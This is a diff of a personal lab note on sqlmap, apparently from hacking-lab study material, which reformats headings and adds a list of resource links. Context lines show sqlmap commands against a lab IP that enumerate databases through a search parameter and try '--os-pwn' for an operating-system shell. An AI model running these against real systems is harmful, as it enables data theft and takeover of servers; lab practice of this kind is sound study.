@@ -1,8 +1,8 @@
 # sqlmap
 
-Author: Julien Bongars
-Date: 2025-09-20 17:29:29
-Path: /opt/development/cybersec/hacklas/notes/enumeration/sql/sqlmap.md
+**Author:** Julien Bongars\
+**Date:** 2025-09-20 17:29:29
+**Path:** /opt/development/cybersec/hacklas/notes/enumeration/sql/sqlmap.md
 
 ---
 
@@ -26,7 +26,8 @@ For GET parameter (your case):
 bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" --dbs
 ```
 
-Common SQLMap Options
+## Common SQLMap Options
+
 Get current database:
 
 ```bash
@@ -175,3 +176,11 @@ sqlmap -r request.txt --os-pwn
 
 # haven't figured a way to get a reverse shell for now aside from direct SQL injection. See notes
 ```
+
+## Resources
+
+- [sqlmap](https://sqlmap.org/) — official project homepage
+- [Font Awesome kit](https://use.fontawesome.com/33a3739634.js) — URL inside the captured Burp response
+- [jQuery 2.1.3](https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js) — URL inside the captured Burp response
+- [jQuery tablesorter](https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js) — URL inside the captured Burp response
+- [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap) — source and docs
